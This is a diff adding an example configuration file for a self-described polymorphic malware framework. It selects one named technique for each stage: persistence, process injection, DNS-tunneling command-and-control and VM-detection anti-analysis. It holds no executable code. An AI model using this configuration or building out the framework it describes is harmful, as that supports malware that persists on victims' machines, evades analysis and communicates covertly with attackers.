@@ -1,0 +1,14 @@
+# Example config.toml for the PMSF Polymorphic Malware Framework
+# Specify one technique per stage or omit to use random selection.
+
+# Persistence stage technique: choose from RegistryRunKeys, ScheduledTasks, WMIEventSubscription
+persistence = "ScheduledTasks"
+
+# Execution stage technique: choose from ClassicProcessInjection, MappingInjection, ThreadHijacking, DirectSyscallExecution
+execution = "MappingInjection"
+
+# C2 stage technique: choose from HTTPSCommunication, DNSTunneling, ICMPCommunication, RawSocketsCommunication
+c2 = "DNSTunneling"
+
+# Anti-analysis stage technique: choose from AntiDebugging, VMDetection, SandboxEvasion
+anti_analysis = "VMDetection" 
